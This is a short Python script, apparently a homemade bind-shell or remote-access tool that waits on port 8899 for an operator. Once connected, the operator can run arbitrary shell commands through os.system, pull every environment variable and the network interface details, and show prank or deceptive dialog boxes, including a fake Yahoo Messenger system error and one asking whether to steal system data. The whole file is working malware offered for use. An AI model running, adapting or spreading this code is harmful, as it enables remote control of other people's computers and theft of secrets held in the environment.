import socket
server=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
ip='enter the ip address of bind shell '
port=8899
server.bind((ip,port))
server.listen(25)
client,address=server.accept()
print('connected one is '+address[0])
while True:
    message=input('-> ')
    client.send(message.encode())
    recv=client.recv(1024).decode()
    print(recv)
    if recv=="OS":
        client.send('enter the bash commands'.encode())
        message=client.recv(102400).decode()
        import os
        output=os.system(message)
        client.send(str(output).encode())
    elif recv=='play':
        client.send('see how this plays'.encode())
        from tkinter import messagebox
        messagebox.askyesno('are you single...','say yes or no That you are single or not....')
        messagebox.showerror('YahooMessenger.exe-System Error','The program can`t start because nspr4.dll is missing from your computer. Try reinstalling the program to fix this issue....')
        messagebox.showinfo('Hey man','Do you remember me , I was one among witness of natures action upon you...')
        messagebox.askquestion('Question','Shall I steal your system data...')
    elif recv=='send-me-os-info':
        client.send('I am  sending the os information...'.encode())
        import os
        for i in os.environ.values():
            client.send(f'"\n{i}\n"'.encode())
        import psutil
        network_info=psutil.net_if_stats()
        client.send(f'"\n{network_info}\n"'.encode())
    elif recv=="chat-with-box":
        answer=client.recv(50000).decode()
        from tkinter import messagebox
        ans=messagebox.askquestion('ANSWER TO HACKER QUESTION....',answer)
        client.send(ans.encode())